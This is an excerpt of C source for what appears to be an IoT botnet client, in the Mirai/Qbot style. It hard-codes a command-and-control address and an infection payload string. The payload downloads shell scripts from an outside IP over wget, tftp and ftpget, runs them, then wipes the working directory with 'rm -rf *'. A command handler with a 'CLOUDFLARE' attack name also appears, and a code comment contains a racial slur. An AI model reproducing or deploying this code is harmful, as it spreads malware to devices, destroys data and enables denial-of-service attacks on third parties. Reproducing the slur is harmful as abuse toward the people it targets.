...
unsigned char *commServer[] = {"185.181.9.68:666"};
//u cant use another type of bins if u plan to use the update command
char *payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.181.9.68/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.181.9.68 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.181.9.68; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.181.9.68 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *";
...
void processCmd(int argc, unsigned char *argv[])
{
        ...
        if (!strcmp(argv[0], "CLOUDFLARE"))//flipper#8205 made the name Ayedz u niggers
        {
